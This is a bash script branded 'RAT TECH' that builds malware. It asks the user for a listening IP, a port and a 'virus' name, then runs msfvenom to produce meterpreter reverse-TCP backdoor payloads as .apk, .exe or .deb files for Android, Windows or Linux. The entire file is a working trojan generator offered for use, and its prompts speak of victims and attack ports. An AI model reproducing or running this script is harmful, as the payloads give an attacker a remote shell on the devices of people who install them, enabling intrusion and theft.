#!/bin/bash
echo "Welcome to RAT TECH , ~Udit Singh Dhakrey"
echo "You want to make the payload for"
echo "/n
1. Android /n
2. Windows 64-bit
3. Windows 32-bit
4. Linux
"
echo "Enter the number of payload that is show above."

read pay_num
	if(($pay_num == 1))
	then
		echo "Your IP"
		read ip
		echo "IP is $ip"
		echo "Port for attack"
		read port
		echo  "port is $port"
		echo "Name the Virus"
		read name
		echo name of payload is $name.apk
		echo "your victim ip is $ip , port is $port and name is $name.apk"
		msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port>$name.apk
		fi
	if(($pay_num == 2))
	then
		echo "Your IP"
		read ip
		echo "IP is $ip"
		echo "Port for attack"
		read port
		echo  "port is $port"
		echo "Name the Virus"
		read name
		echo name of payload is $name.exe
		echo "your victim ip is $ip , port is $port and name is $name.exe"
		msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=$ip lport=$port -f exe>$name.exe
		fi
	if(($pay_num == 3))
	then
		echo "Your IP"
		read ip
		echo "IP is $ip"
		echo "Port for attack"
		read port
		echo  "port is $port"
		echo "Name the Virus"
		read name
		echo name of payload is $name.exe
		echo "your victim ip is $ip , port is $port and name is $name.exe"
		msfvenom -p windows/meterpreter_reverse_tcp lhost=$ip lport=$port -f exe>$name.exe
		fi
	if(($pay_num == 4))
	then
		echo "Your IP"
		read ip
		echo "IP is $ip"
		echo "Port for attack"
		read port
		echo  "port is $port"
		echo "Name the Virus"
		read name
		echo name of payload is $name.deb
		echo "your victim ip is $ip , port is $port and name is $name.deb"
		msfvenom -p linux/meterpreter_reverse_tcp lhost=$ip lport=$port >$name.deb
		fi
		
		echo Payload save in 
		pwd
		
		
	echo "
	
	
	
	
	
	
	
	
	
	*Thanks for Using!*"
